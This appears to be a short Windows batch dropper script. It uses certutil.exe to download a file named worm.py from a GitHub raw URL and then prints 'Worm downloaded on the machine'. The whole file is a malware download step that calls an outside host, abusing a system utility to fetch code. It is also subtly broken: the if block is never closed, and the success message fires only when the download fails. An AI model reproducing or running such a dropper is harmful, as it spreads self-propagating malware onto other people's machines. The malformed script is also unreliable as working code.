@echo off
setlocal enableextensions
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/sonupreetam/worm/main/worm.py worm.py
if %errorlevel% NEQ 0 (
echo.
echo Worm downloaded on the machine
pause
exit
pause
